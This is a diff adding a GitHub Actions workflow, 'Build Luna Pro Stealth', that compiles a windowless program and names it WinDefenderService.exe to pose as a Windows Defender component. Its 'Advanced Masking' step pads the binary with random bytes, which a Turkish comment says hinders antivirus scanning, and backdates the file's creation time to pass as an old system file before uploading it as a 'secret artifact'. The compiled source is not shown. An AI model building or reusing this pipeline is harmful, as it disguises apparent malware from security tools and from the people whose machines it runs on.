@@ -1,0 +1,41 @@
+name: Build Luna Pro Stealth
+
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Get Libraries
+      run: |
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h -OutFile httplib.h
+
+    - name: Compile with Optimization
+      run: |
+        # /MT: Statik kütüphane bağla (DLL gerektirmez)
+        # /O2: Maksimum hız optimizasyonu
+        # /subsystem:windows: Konsolu tamamen yok eder
+        cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib /subsystem:windows
+
+    - name: Advanced Masking
+      run: |
+        $exe = "WinDefenderService.exe"
+        # 1. Dosya boyutunu rastgele büyüt (Antivirüs taramasını zorlaştırır)
+        $randSize = Get-Random -Minimum 1048576 -Maximum 3145728
+        $junk = New-Object Byte[] $randSize
+        (New-Object Random).NextBytes($junk)
+        Add-Content -Path $exe -Value $junk -Encoding Byte
+        
+        # 2. Dosya Tarihini Değiştir (Eski bir sistem dosyası gibi göster)
+        (Get-Item $exe).CreationTime = "2021-05-12 10:00:00"
+
+    - name: Upload Secret Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: LunaPro_Binary
+        path: WinDefenderService.exe
+        
